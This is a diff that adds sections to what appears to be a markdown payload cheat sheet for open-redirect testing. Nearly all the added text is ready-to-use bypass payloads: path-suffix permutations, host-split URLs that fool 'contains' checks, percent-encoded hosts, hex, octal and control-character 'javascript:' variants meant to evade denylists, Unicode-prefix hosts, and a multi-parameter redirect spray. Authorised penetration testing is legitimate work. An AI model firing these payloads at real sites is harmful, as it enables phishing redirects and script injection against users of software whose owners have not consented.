@@ -171,3 +171,106 @@ awk '/30[1237]|Location:/I' results.txt
 Redirect status codes that confirm a server-driven hit: `301 302 303 307 308`.
 Bodyless redirects still phish — also grep responses for
 `<meta http-equiv="refresh" content="0;url=//oast.live">`.
+
+## Path-suffix permutation grid (validator inspects the TRAILING path)
+
+When a validator looks at what comes after the host (or strips a path
+segment before checking), append a path-traversal/junk suffix and cycle
+the slash count + scheme prefix. Replace `EVIL` with your collaborator
+host and `WL` with the target's own whitelisted host. Each line is one
+test input.
+
+```text
+//EVIL/%2f..
+//WL@EVIL/%2f..
+///EVIL/%2f..
+////EVIL/%2f..
+https://EVIL/%2f..
+/https://EVIL/%2f..
+//EVIL/%2e%2e%2f
+//WL@EVIL/%2e%2e%2f
+https:///EVIL/%2e%2e
+//https:///EVIL/%2e%2e
+//EVIL/        //EVIL//      ///EVIL/      ////EVIL/
+//EVIL/%2f%2e%2e   //WL@EVIL/%2f%2e%2e
+/%09/EVIL    //%09/EVIL    ///%09/EVIL    https://%09/EVIL
+/%5cEVIL     //%5cEVIL     ///%5cEVIL     https://%5cEVIL
+///\;@EVIL   ////\;@EVIL
+/.EVIL                       # leading-dot host, parsers may drop the dot
+//WL/https://EVIL/           # WL turned into a folder under attacker root
+```
+
+## Trusted-host-appended host-split forms (real host FIRST)
+
+Inverse of the userinfo `@` trick: the REAL external host appears first
+and the trusted name is forced into path/query/fragment/credential or a
+junk separator, so a `contains("trusted")` check still passes while the
+browser navigates to the real host.
+
+```text
+http://EVIL:80#@WL/
+http://EVIL:80?@WL/
+http://EVIL\WL                 # backslash — browser treats as host/path split
+http://EVIL&WL
+//EVIL\@WL
+https://:@EVIL\@WL
+http://EVIL/WL/                # WL becomes a folder under EVIL
+http://EVIL?WL/                # "?" rewritten to "/?", WL becomes query
+http://WL.EVIL                 # WL as a subdomain label of EVIL
+http:///////////EVIL           # many leading slashes collapse to //EVIL
+\\EVIL                         # backslash-only protocol-relative form
+```
+
+## Whole-URL and partial percent/escape encoding
+
+Defeats keyword denylists (`http`, `//`, `javascript`) that scan the raw
+string by encoding the bytes the filter looks for.
+
+```text
+# Full hex-encode of  http://EVIL
+%68%74%74%70%3a%2f%2f%65%76%69%6c%2e%63%6f%6d
+# Encode only the host
+/http://%65%76%69%6c%2e%63%6f%6d
+http://%65%76%69%6c%2e%63%6f%6d
+# /%2f%5c%2f...  slash-backslash-slash encoded, collapses to //host
+/%2f%5c%2f%65%76%69%6c%2e%63%6f%6d/
+```
+
+JS-scheme escape variants (DOM `location=`/`href` sinks — the parser
+un-escapes before the denylist runs, so the literal word `javascript`
+never appears):
+
+```text
+\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3aalert(1)   # \x hex
+javascript:alert(1)   # \u
+\152\141\166\141\163\143\162\151\160\164\072alert(1)   # octal
+ja\nva\tscript\r:alert(1)                              # control chars mid-word
+```
+
+## Ideographic / control prefix chars (browser strips, leaves bare host)
+
+Certain leading Unicode glyphs are dropped by the browser's URL parser,
+so `<glyph>EVIL` resolves to `EVIL`. Useful when the validator rejects a
+leading `/` or `//` but does not strip these.
+
+```text
+〱EVIL   〵EVIL   ゝEVIL   ーEVIL   ｰEVIL
+/〱EVIL  /〵EVIL  /ゝEVIL  /ーEVIL  /ｰEVIL
+```
+
+## Combined-param spray (one request, many names)
+
+Set every common redirect param in a single request so one bad validator
+fires regardless of which name the app reads.
+
+```text
+/?url=//EVIL&next=//EVIL&redirect=//EVIL&redir=//EVIL&rurl=//EVIL&redirect_uri=//EVIL
+/redirect?url=//EVIL&next=//EVIL&redirect=//EVIL&redir=//EVIL&rurl=//EVIL&redirect_uri=//EVIL
+/?url=Https://EVIL&next=Https://EVIL&redirect=Https://EVIL   # mixed-case scheme
+```
+
+The full pre-built Burp-Intruder corpus (`WL@google.com/%2f..` ×
+slash-count × suffix matrix, ~240 lines) lives upstream at
+PayloadsAllTheThings `Open Redirect/Intruder/Open-Redirect-payloads.txt`
+— feed it to `ffuf`/`feroxbuster` as a wordlist when a single suspected
+param resists the inline list above.
